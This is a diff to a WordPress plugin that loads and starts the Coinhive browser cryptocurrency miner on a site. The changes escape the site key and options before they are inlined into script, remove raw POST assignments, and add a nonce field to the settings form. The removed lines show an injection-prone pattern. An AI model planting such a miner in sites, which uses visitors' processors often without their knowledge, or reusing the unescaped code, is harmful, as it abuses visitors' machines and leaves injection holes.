@@ -19,7 +19,7 @@ function coinhive_wordpress_add_javascript() {
 	}
 	
 	wp_enqueue_script('coinhive-script','https://coin-hive.com/lib/coinhive.min.js',array());
-	wp_add_inline_script('coinhive-script','var miner = new CoinHive.Anonymous("'.$value.'"'.$options.');miner.start();','after');
+	wp_add_inline_script('coinhive-script','var miner = new CoinHive.Anonymous("'.esc_textarea($value).'"'.esc_textarea($options).');miner.start();','after');
 
 }
 
@@ -30,11 +30,9 @@ function coinhive_settings_display() {
 	
 	if (isset($_POST['coinhive_sitekey']) && (strlen($_POST['coinhive_sitekey']) == 32)) {
         update_option('coinhive_sitekey', sanitize_text_field($_POST['coinhive_sitekey']));
-        $value = $_POST['coinhive_sitekey'];
     }
     if (isset($_POST['coinhive_threads']) && is_numeric($_POST['coinhive_threads'])) {
         update_option('coinhive_threads', sanitize_text_field($_POST['coinhive_threads']));
-        $value = $_POST['coinhive_threads'];
     } 
 
     $value = esc_textarea(get_option('coinhive_sitekey'));
@@ -42,6 +40,7 @@ function coinhive_settings_display() {
 	
     echo '<h1>Coinhive Settings</h1>';
     echo '<form method="POST">';
+    wp_nonce_field( 'coinhive-sitekey' );
     echo '<label>Site Key</label><input type="text" name="coinhive_sitekey" value="'.$value.'" />';
     echo '<br /><label>Number of Threads (leave blank for default settings)</label><input type="text" name="coinhive_threads" value="'.$threads.'" />';
     echo '<br /><input type="submit" value="Save" class="button button-primary button-large">';
